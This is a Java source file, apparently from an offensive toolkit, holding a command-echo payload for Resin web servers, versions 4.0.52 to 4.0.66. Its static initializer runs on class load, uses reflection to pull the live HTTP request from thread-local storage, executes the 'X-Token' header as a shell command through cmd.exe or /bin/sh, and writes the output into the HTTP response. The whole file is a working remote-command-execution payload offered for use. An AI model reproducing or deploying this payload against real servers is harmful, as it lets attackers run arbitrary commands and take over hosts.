package org.example.resin.echo;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 *
 * TargetObject = {com.caucho.env.thread2.ResinThread2}
 *   ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
 *    ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
 *     ---> [13] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}
 *      ---> value = {com.caucho.server.http.HttpRequest}
 * idea_express: TargetObject.threadLocals.get("table").get("13").get("value")
 *
 * Version test
 *  [4.0.52, 4.0.66]
 */
public class ResinEcho {
    static {
        try {
            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");

            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

                if (value.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                    Object request = value;
                    String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, "X-Token");
                    String result = exec(header);
                    Object response = request.getClass().getMethod("createResponse").invoke(request);
                    Method responseStreamMethod = response.getClass().getDeclaredMethod("createResponseStream");
                    responseStreamMethod.setAccessible(true);

                    Object responseStream = responseStreamMethod.invoke(response);
                    responseStream.getClass().getSuperclass().getSuperclass().getDeclaredMethod("write", byte[].class, int.class, int.class).invoke(responseStream, result.getBytes(), 0, result.getBytes().length);
                    responseStream.getClass().getDeclaredMethod("close").invoke(responseStream);

                    break;
                }
            }

        } catch (Exception e) {
            // 测试
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static String exec(String str) {
        String result = "";
        try {
            String[] cmd = null;
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
        } catch (Exception e) {

        }
        return result;
    }
}
